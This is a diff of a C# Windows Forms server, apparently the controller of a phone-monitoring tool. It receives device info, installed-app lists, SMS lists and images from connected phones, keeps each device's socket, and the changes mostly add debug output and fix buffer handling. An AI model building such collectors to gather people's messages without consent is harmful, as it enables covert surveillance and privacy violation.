@@ -73,46 +73,49 @@ namespace ClientCtrl
         //接受客户端消息
         private void ReciveContent(Object obj)
         {
+
             Socket socketServer = obj as Socket;
 
             byte[] uuidByte = new byte[36];
             socketServer.Receive(uuidByte);
             //每个请求都有唯一标识
-            String uuid= System.Text.UTF8Encoding.Default.GetString(uuidByte);
+            String uuid = System.Text.UTF8Encoding.Default.GetString(uuidByte);
 
             byte[] headerByte = new byte[3];
             socketServer.Receive(headerByte);
             String header = System.Text.UTF8Encoding.Default.GetString(headerByte);
             listBox_log.Items.Add("client:===header:" + header);
 
-            byte[] buffer = new byte[10 * 1024 * 1024];
+            byte[] buffer = new byte[10 * 1024];
             int length = 0;
-
             if ("str".Equals(header))
             {
                 StringBuilder sb = new StringBuilder();
                 while ((length = socketServer.Receive(buffer)) > 0)
                 {
-                    sb.Append(UTF8Encoding.UTF8.GetChars(buffer));
+                    sb.Append(UTF8Encoding.UTF8.GetChars(buffer,0,length));
 
                 }
+                Console.WriteLine("str==content====" + sb.ToString());
                 ClientInfoBean clientInfo = AllUtils.jsonToObj(sb.ToString(), typeof(ClientInfoBean)) as ClientInfoBean;
-
+                Console.WriteLine("111==========");
                 if (clientInfo == null)
                 {
+
+                    Console.WriteLine("clientInfo==null==========");
                     return;
                 }
                 //upData
-                addDataList(clientInfo, socketServer);
-
+                 addDataList(clientInfo, socketServer);
+                Console.WriteLine("2222==========");
                 UIAppList.updataAppsData(this.dataGridView_apps, clientInfo.appList);
 
                 IPEndPoint clientipe = (IPEndPoint)socketServer.RemoteEndPoint;
                 clientInfo.ipAddress = clientipe.Address.ToString();
                 UIAppList.updataPhoneInfo(this.listBox_phone_info, clientInfo);
-
+                Console.WriteLine("3333==========");
                 UIAppList.updataSmsList(this.dataGridView_sms, clientInfo.smsList);
-
+                Console.WriteLine("app列表：" + clientInfo.appList);
                 return;
             }
             //接受的是图片
@@ -143,6 +146,15 @@ namespace ClientCtrl
         //添加一条记录到列表
         private void addDataList(ClientInfoBean clientInfo, Socket socket)
         {
+            if (clientInfo == null)
+            {
+                return;
+            }
+            if (hashTableSocket == null)
+            {
+                hashTableSocket = new Hashtable();
+            }
+
             if (!hashTableSocket.ContainsKey(clientInfo.deviceId))
             {
                 hashTableSocket.Add(clientInfo.deviceId, socket);
@@ -163,18 +175,7 @@ namespace ClientCtrl
         {
             hashTableSocket = new Hashtable();
 
-            //test
-            int index = this.dataGridView1.Rows.Add();
-            this.dataGridView1.Rows[index].Cells[0].Value = "第" + index + "条";
-            this.dataGridView1.Rows[index].Cells[1].Value = "alis";
 
-            int index2 = this.dataGridView1.Rows.Add();
-            this.dataGridView1.Rows[index].Cells[0].Value = "第" + index2 + "条";
-            this.dataGridView1.Rows[index].Cells[1].Value = "alis";
-
-            int index3 = this.dataGridView1.Rows.Add();
-            this.dataGridView1.Rows[index].Cells[0].Value = "第" + index3 + "条";
-            this.dataGridView1.Rows[index].Cells[1].Value = "alis";
 
         }
 
@@ -193,13 +194,13 @@ namespace ClientCtrl
             Console.WriteLine("SelectionChanged===");
             DataGridView viewData = sender as DataGridView;
 
-            
+
 
         }
 
         private void dataGridView1_RowEnter(object sender, DataGridViewCellEventArgs e)
         {
-            Console.WriteLine("dataGridView1_RowEnter==="+e.RowIndex);
+            Console.WriteLine("dataGridView1_RowEnter===" + e.RowIndex);
         }
     }
 }
